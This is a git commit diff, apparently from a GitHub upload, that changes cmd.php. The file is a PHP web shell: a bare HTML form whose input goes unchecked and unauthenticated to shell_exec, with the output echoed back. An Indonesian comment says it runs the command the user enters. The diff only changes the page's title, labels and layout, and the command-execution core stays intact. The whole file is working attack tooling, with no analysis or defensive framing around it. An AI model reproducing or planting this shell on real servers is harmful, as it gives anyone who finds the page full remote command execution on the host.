d0b8ebce0ceda8160209b6642dc1db0431737b8a
TN.RIJ4L <59259192+rijal-cpu@users.noreply.github.com>
2025-02-04 16:38:01 +0800

    Add files via upload

--- cmd.php
+++ cmd.php
@@ -1,28 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>command prompt</title>
+    <title>CMD</title>
 </head>
 <body>
     <center>
-    <br />
-    <br />
-    <br />
-    <br />
-    <br />
+    <h1>CMD</h1>
     <form method="post">
-        <label for="command"></label>
-        <input type="text" name="command" id="command" placeholder="command">
-        <input type="submit" value="go">
+        <label for="command">command:</label>
+        <input type="text" name="command" id="command" placeholder="Enter command here" required>
+        <input type="submit" value="Go">
     </form>
-
+    
+    <hr>
+    
     <?php
     if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $command = $_POST['command'];
+
+        // Menjalankan perintah yang dimasukkan pengguna
         $output = shell_exec($command);
         echo "<pre>$output</pre>";
     }
     ?>
+    
     </center>
 </body>
 </html>
